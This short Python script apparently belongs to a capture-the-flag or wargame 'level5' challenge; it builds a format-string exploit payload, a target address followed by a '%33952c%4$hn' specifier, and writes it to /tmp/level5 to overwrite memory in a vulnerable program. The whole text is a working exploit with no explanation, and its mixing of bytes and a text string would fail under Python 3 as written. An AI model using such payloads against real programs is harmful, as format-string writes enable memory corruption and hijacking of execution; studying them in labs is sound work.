payload = b"\x38\x98\x04\x08"
payload += "%33952c%4$hn"

with open('/tmp/level5', 'wb') as f:
    f.write(payload)
